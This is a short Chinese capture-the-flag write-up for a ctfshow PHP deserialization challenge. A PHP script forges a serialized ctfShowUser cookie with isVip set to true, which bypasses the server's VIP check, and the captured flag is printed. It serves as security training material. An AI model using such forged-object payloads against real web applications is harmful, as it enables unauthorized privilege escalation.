从cookie中获取user，然后反序列化，再通过login、checkVip函数判断。
只需生成一个isVip为true的对象序列化字符串。
```
<?php
class ctfShowUser{
    public $isVip;
    public $username='xxxxxx';
    public $password='xxxxxx';
}
$a = new ctfShowUser();
$a->isVip = true;
echo urlencode(serialize($a));
?>
```
flag : ctfshow{e6be0932-e4b6-4048-945e-439329770917}